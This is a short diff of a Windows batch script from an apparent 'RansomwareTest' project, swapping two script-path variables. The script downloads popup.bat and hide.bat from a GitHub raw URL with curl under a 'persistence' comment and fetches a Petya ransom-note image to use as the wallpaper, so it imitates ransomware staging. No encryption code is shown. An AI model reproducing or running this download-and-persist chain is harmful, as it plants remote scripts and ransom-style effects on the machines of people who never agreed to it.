@@ -3,8 +3,8 @@ set "url1=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.b
 set "url2=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/hide.bat"
 set "wallpaperurl=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/petya-ransom-note.jpg"
 set "wallpaperpath=C:\temp\petya-ransom-note.jpg"
-set "Script1=C:\temp\hide.bat"
-set "Script2=C:\temp\popup.bat"
+set "Script1=C:\temp\popup.bat"
+set "Script2=C:\temp\hide.bat"
 
 :: persistence
 curl -L -o %Script1% %url1%
